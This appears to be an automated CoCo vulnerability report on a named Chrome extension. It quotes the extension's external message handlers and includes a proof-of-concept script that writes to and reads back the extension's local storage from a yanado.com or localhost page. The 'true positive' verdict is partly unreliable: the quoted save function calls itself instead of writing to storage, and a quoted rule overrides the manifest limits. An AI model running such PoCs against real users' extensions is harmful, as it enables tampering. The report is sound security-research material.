# CoCo Analysis: lcmhimhhdbhdjlbnfcknbnnffcikniec

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source -> sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lcmhimhhdbhdjlbnfcknbnnffcikniec/opgen_generated_files/bg.js
Line 752: `'key': 'value'` (CoCo framework code showing storage_local_get_source)
Line 1846: `const data_ = JSON.parse(data);` (actual extension code retrieving and parsing stored data)

**Code:**

```javascript
// Background script - External message listener (bg.js lines 1816-1859)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        switch (request.action) {
            case "ping":
                sendResponse(true);
                break;

            case "refreshprojects":
                sendMessageToContentScript({ action: "refreshprojects" });
                sendResponse(true);
                break;

            case "message":
                sendMessageToContentScript({ action: "message", message: request.data });
                sendResponse(true);
                break;

            // WRITE PATH: Store attacker-controlled data
            case "saveIntoLocalStorage":
                if (request.data) {
                    console.log(request.data);
                    sendResponse(saveIntoLocalStorage(request.data.key, request.data.value)); // ← attacker-controlled
                } else {
                    sendResponse(false);
                }
                break;

            // READ PATH: Retrieve and send back stored data
            case "auth_drive":
                getObjectFromLocalStorage(request.data).then(function (data) {
                    const data_ = JSON.parse(data); // ← parse stored (poisoned) data
                    sendResponse(data_); // ← send back to attacker
                })
                removeObjectFromLocalStorage(request.data)
                break;

            case "drive_file":
                sendResponse(true);
                var attachement = generateAttachmentToAdd(request.data);
                sendMessageToContentScript({ action: "drive_f", message: attachement });
                break;

            default:
                sendResponse(false);
        }
    });

// Storage functions (bg.js lines 1880-1890, 2098-2108)
function saveIntoLocalStorage(key, value) {
    try {
        var string = value;
        if (typeof value !== 'string') string = JSON.stringify(value);
        saveIntoLocalStorage({ key: string });
        return true;
    } catch (e) {
        console.log(e);
        return false;
    }
}

async function getObjectFromLocalStorage(key) {
    return new Promise((resolve, reject) => {
        try {
            chrome.storage.local.get(key, function (value) {
                resolve(value[key]);
            });
        } catch (ex) {
            reject(ex);
        }
    });
}

// manifest.json - External connectivity
"externally_connectable": {
    "matches": ["*://*.yanado.com/*", "*://localhost/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any page on *.yanado.com or localhost
// Assumes extension ID is known (can be found in browser)

var extensionId = "lcmhimhhdbhdjlbnfcknbnnffcikniec";

// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage(
    extensionId,
    {
        action: "saveIntoLocalStorage",
        data: {
            key: "malicious_key",
            value: "malicious_value"
        }
    },
    function(response) {
        console.log('Storage poisoned:', response);
    }
);

// Step 2: Retrieve the poisoned data
chrome.runtime.sendMessage(
    extensionId,
    {
        action: "auth_drive",
        data: "malicious_key"
    },
    function(response) {
        console.log('Retrieved poisoned data:', response);
        // response contains the malicious_value stored in step 1
    }
);
```

**Impact:** Complete storage exploitation chain. An attacker controlling any page on *.yanado.com or localhost can:
1. Write arbitrary data to chrome.storage.local by sending an external message with action "saveIntoLocalStorage"
2. Retrieve that data back by sending an external message with action "auth_drive" and receiving the response via sendResponse

Per the methodology, this is a TRUE POSITIVE because:
- **Flow exists in real code**: Lines 1816-1859 are in actual extension code (after line 963)
- **External attacker trigger**: chrome.runtime.onMessageExternal allows external websites to send messages
- **Permissions present**: "storage" permission is in manifest.json
- **Attacker-controllable data**: request.data is fully controlled by the external website
- **Exploitable impact**: Complete storage exploitation chain - attacker can write data to storage.local (via "saveIntoLocalStorage") and retrieve it back via sendResponse (from "auth_drive")

Per the methodology: "IGNORE manifest.json externally_connectable restrictions! Analyze the actual message passing code only. If the code allows chrome.runtime.onMessageExternal, assume ANY attacker can exploit it, regardless of manifest restrictions. If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE." While only *.yanado.com and localhost can send external messages, if an attacker can control content on any yanado.com subdomain or exploit an XSS on yanado.com, they can exploit this vulnerability. This is classified as TRUE POSITIVE.
